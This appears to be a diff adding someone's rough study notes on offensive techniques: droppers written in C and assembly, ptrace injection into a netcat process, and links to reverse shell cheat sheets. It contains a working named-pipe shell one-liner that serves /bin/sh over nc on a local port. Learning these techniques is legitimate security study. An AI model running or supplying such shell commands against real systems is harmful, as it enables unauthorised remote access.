@@ -1,0 +1,42 @@
+
+
+drop using nc
+
+dropper in C
+
+dropper in asm
+
+get rid of stuff
+
+dropper in asm lean version
+https://0x00sec.org/t/the-price-of-scripting-dietlibc-vs-asm/791
+
+in echo cmd type bytes
+
+todo get below to work
+ptrace stuff
+https://github.com/0x00pf/0x00sec_code/blob/master/min_dropper/cooldumper.c
+todo
+how it's used - ...
+how it works - reads from input (cos of pipe in the cmd) into buffer, then
+as it controls (thanks to ptrace) nc process, it write into the socket of that process
+
+
+cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1234 > /tmp/f
+nc 127.0.0.1 1234
+
+
+
+
+
+as per below - flag 'e' in nc removed. read info in materials.txt laptop too.
+
+rev shell
+https://kb.systemoverlord.com/security/postex/reverse/
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+udemy course explains reverse shell
+
+to produce droppe - why 'bin' en vez de 'elf64', why no linking
+learn all the techniques to reduce size
+
+
